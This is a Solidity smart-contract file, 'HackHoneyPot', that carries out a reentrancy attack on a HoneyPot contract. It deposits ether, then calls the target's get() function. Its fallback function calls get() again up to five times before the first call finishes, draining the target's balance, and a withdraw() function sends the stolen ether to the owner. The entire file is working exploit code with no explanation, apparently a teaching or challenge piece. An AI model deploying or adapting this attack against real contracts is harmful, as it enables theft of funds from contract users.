pragma solidity ^0.4.17;


import './Ownable.sol';
import './HoneyPot.sol';


contract HackHoneyPot is Ownable {
    uint8 public i;
    HoneyPot private honey;

    function() public payable {
        if (i < 5) {
            i++;
            honey.get();
        } else {
            i = 0;
        }
    }

    function put(address honeyPotAddr) public payable onlyOwner {
        honey = HoneyPot(honeyPotAddr);
        honey.put.value(msg.value)();
    }

    function steal() public onlyOwner {
        honey.get();
    }

    function withdraw() public onlyOwner {
        getOwner().transfer(this.balance);
    }
}